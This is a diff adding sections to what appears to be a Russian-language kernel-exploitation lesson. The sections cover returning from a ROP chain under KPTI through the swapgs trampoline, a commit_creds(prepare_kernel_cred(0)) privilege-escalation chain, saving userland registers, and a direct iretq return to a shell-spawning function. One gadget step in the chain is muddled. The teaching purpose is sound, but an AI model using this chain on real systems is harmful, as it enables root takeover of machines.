@@ -164,6 +164,111 @@ __asm__ volatile(
 - Нужно сохранить CS/SS/RFLAGS/SP из userland заранее.
 - Data-only иногда избавляет от возврата вовсе.
 
+## Дизассемблируем trampoline
+
+Чтобы найти правильный offset внутри `swapgs_restore_regs_and_return_to_usermode`,
+дизассемблируем её:
+
+```
+$ objdump -d vmlinux --start-address=0xffffffff81e00e10 | head -30
+ffffffff81e00e10 <swapgs_restore_regs_and_return_to_usermode>:
+ffffffff81e00e10:  pop    r15
+ffffffff81e00e11:  pop    r14
+ffffffff81e00e12:  pop    r13
+ffffffff81e00e13:  pop    r12
+ffffffff81e00e14:  pop    rbp
+ffffffff81e00e15:  pop    rbx
+ffffffff81e00e16:  pop    r11
+ffffffff81e00e17:  pop    r10
+ffffffff81e00e18:  pop    r9
+ffffffff81e00e19:  pop    r8
+ffffffff81e00e1a:  pop    rax
+ffffffff81e00e1b:  pop    rcx
+ffffffff81e00e1c:  pop    rdx
+ffffffff81e00e1d:  pop    rsi
+ffffffff81e00e1e:  mov    rdi, rsp
+ffffffff81e00e21:  mov    rsp, qword ptr gs:[0x6004]
+...
+```
+
+Нам нужна точка **`mov rdi, rsp`** (в примере `+14` от начала, но число зависит
+от ядра и набора пропускаемых `pop`). После неё ядро ожидает на стеке значения
+для `iretq`: `RIP, CS, RFLAGS, RSP, SS`. Именно их мы и кладём в конец
+ROP-цепочки.
+
+## Полная цепочка ROP с возвратом
+
+Собираем всё вместе:
+
+```c
+// 1) commit_creds(prepare_kernel_cred(0))
+chain  = p64(pop_rdi_ret);
+chain += p64(0);                       // аргумент: NULL
+chain += p64(prepare_kernel_cred);
+chain += p64(pop_rdi_ret);
+chain += p64(0x0);                     // вернём указатель в rdi? -> нужен mov rdi, rax
+chain += p64(mov_rdi_rax_ret);         // переносим cred в rdi
+chain += p64(commit_creds);
+// 2) возврат в userland через trampoline
+chain += p64(trampoline + offset);
+chain += p64(0); chain += p64(0);      // rax, rdi (мусор)
+chain += p64(user_rip);                // win()
+chain += p64(user_cs);
+chain += p64(user_rflags);
+chain += p64(user_sp);
+chain += p64(user_ss);
+```
+
+Порядок «мусорных» значений (rax, rdi) зависит от точки входа trampoline: сколько
+регистров она ещё восстанавливает из стека, столько слов надо положить. Проверяй
+по дизассемблеру.
+
+## Сохранение userland-состояния
+
+Функция `save_state` вызывается **до** триггера уязвимости, пока мы ещё в
+userland:
+
+```c
+uint64_t user_cs, user_ss, user_rflags, user_sp;
+void save_state(void) {
+    __asm__ volatile(
+        "mov %%cs, %0\n"
+        "mov %%ss, %1\n"
+        "pushfq\n"
+        "pop %2\n"
+        "mov %%rsp, %3\n"
+        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_sp)
+        :
+        : "memory");
+}
+```
+
+`user_rip` — адрес функции `win()`, которая после возврата откроет shell.
+`user_sp` можно взять из сохранённого значения; главное, чтобы он указывал на
+валидную userland-страницу.
+
+## Когда KPTI нет
+
+Проверяем:
+
+```
+$ grep -i pti /proc/cpuinfo
+$ cat /sys/devices/system/cpu/vulnerabilities/meltdown
+```
+
+Если `Mitigation: PTI` отсутствует (старое ядро или `nopti`), прямой возврат
+работает:
+
+```c
+__asm__ volatile(
+    "swapgs; mov %0, %%rsp; push %1; push %2; push %3; push %4; push %5; iretq;"
+    :: "r"(user_sp), "r"(user_ss), "r"(user_sp),
+       "r"(user_rflags), "r"(user_cs), "r"(user_rip));
+```
+
+Эксплойт обычно содержит обе ветки и выбирает по наличию PTI — это делает его
+переносимым между ядрами.
+
 ## Квиз
 
 Проверь себя.
